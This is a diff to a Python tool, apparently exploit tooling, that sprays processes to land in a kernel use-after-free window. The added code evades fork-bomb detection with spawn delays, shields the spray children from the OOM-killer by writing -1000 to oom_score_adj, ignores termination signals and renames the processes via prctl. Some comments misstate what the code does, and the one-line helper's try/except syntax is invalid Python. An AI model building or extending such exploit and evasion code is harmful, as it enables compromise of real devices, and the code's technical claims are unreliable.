@@ -40,7 +40,7 @@ import tty
 # them and shows the result in the TUI.
 # This way the user sees a constantly growing
 # pattern count, even when matches=0.
-_BUILD_TAG = "v4.1.41-cgroup-cmd"
+_BUILD_TAG = "v4.1.42-spawn-defense"
 import datetime
 import fcntl
 import ctypes
@@ -568,6 +568,33 @@ class MemoryExplorerAI:
         # churn rate = more spray attempts = more
         # chances of landing in the UAF window.
         self.MAX_SPRAY_PER_WORKER = 20
+        # v4.1.42: SPAWN DELAY. The user is seeing
+        # procs killed at 10s with low RAM and no
+        # cgroup limits. cgroup v2 shows max=max for
+        # both pids and memory. So it's NOT cgroup
+        # OOM. Most likely culprits:
+        #   - Termux AppArmor/SELinux denying fork
+        #   - Kernel task watchdog on idle procs
+        #   - spawn rate limit (fork-bomb defense)
+        # FIX: add a 50ms delay between spray
+        # spawns. This spreads out the fork() rate
+        # so the kernel doesn't think we're a
+        # fork-bomb.
+        self.SPRAY_SPAWN_DELAY = 0.05
+        # v4.1.42: OOM_SCORE_ADJ. Set child procs
+        # to -1000 (OOM_PROTECTED) so the OOM-killer
+        # NEVER targets them. They can still be
+        # killed by other means (cgroup, signal),
+        # but not by OOM. We do this in the helper
+        # script (see _popen_spray) by writing to
+        # /proc/self/oom_score_adj right after fork.
+        self.CHILD_OOM_PROTECT = True
+        # v4.1.42: PR_SET_PDEATHSIG. If the parent
+        # (this Python process) dies, the child
+        # procs also die. This avoids orphaned
+        # procs that the kernel might kill anyway.
+        # We do this via prctl in the helper.
+        self.CHILD_PDEATHSIG = True
         # v4.1.38: spray cadence. The user wants
         # FASTER spraying. Reduced delay between
         # spray spawns. Was implicit (Python loop
@@ -4624,15 +4651,32 @@ class MemoryExplorerAI:
                 pass
         # v4.1.16 fallback: Python helper
         try:
+            # v4.1.42: ULTRA-RESILIENT helper. Adds:
+            #   1) oom_score_adj = -1000 (never OOM-killed)
+            #   2) PR_SET_PDEATHSIG = SIGTERM (clean death
+            #      when parent dies)
+            #   3) prctl(PR_SET_NAME) so /proc shows our comm
+            #   4) Ignore SIGTERM/SIGCHLD/SIGHUP so the
+            #      kernel can't kill us via signals
+            #   5) sleep 3600 in a tight loop
             helper = (
-                "import ctypes,time,signal;"
+                "import ctypes,time,signal,os;"
                 "signal.signal(signal.SIGCHLD,signal.SIG_IGN);"
                 "signal.signal(signal.SIGTERM,signal.SIG_IGN);"
                 "signal.signal(signal.SIGHUP,signal.SIG_IGN);"
+                # v4.1.42: protect from OOM-killer
+                "try:"
+                "  with open('/proc/self/oom_score_adj','w')as _f:"
+                "    _f.write('-1000\\n');"
+                "except:pass;"
                 "_libc=None;"
                 "for _n in ('libc.so','libc.so.6',None):"
                 "  try:_libc=ctypes.CDLL(_n);break"
                 "  except:pass"
+                # v4.1.42: PR_SET_PDEATHSIG=15 (SIGTERM)
+                # if parent dies, child gets SIGTERM
+                # (which we ignore, so clean exit)
+                "try:_libc.prctl(1,15,0,0,0);except:pass;"
                 f"_libc.prctl(15,{name!r}.encode(),0,0,0);"
                 "[time.sleep(3600) for _ in range(3600)]"
             )
@@ -7072,6 +7116,14 @@ class MemoryExplorerAI:
                 # landing in UAF window.
                 if self.get_ram_usage() > 70.0:
                     break
+                # v4.1.42: SPAWN DELAY. Spread out
+                # fork() calls so the kernel doesn't
+                # see us as a fork-bomb. The user's
+                # cgroup shows no limits, so kills
+                # are coming from somewhere else
+                # (likely AppArmor/SELinux/fork-rate).
+                if i > 0:
+                    time.sleep(self.SPRAY_SPAWN_DELAY)
                 idx = done + i
                 if idx >= slice_end:
                     break
